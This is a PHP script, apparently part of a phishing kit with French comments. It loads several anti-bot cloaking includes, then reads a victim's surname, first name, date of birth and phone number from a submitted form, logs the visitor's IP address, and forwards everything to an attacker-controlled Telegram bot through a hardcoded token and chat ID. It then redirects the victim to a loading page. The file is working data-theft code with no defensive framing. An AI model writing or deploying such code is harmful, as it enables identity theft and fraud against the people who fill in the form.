<?php

include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';

// Infos Telegram
$botToken = "8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ";
$chatId = "8134069302";

// Récupération des données
$lastname = htmlspecialchars($_POST['lastname']);
$firstname = htmlspecialchars($_POST['firstname']);
$day = htmlspecialchars($_POST['day']);
$month = htmlspecialchars($_POST['month']);
$year = htmlspecialchars($_POST['year']);
$phone = htmlspecialchars($_POST['phone']);
$ip = $_SERVER['REMOTE_ADDR'];

// Message bien présenté pour Telegram
$message  = "<b>📋 Nouvelle information personnelle reçue :</b>\n\n";
$message .= "<b>👤 Nom :</b> <code>$lastname</code>\n";
$message .= "<b>👤 Prénom :</b> <code>$firstname</code>\n";
$message .= "<b>🎂 Date de naissance :</b> <code>$day/$month/$year</code>\n";
$message .= "<b>📞 Téléphone :</b> <code>$phone</code>\n";
$message .= "<b>🌐 IP :</b> <code>$ip</code>";

// Envoi via Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];

$context = stream_context_create($options);
$response = file_get_contents($url, false, $context);

// Redirection
header("Location: ../chargement.php");
exit();
?>
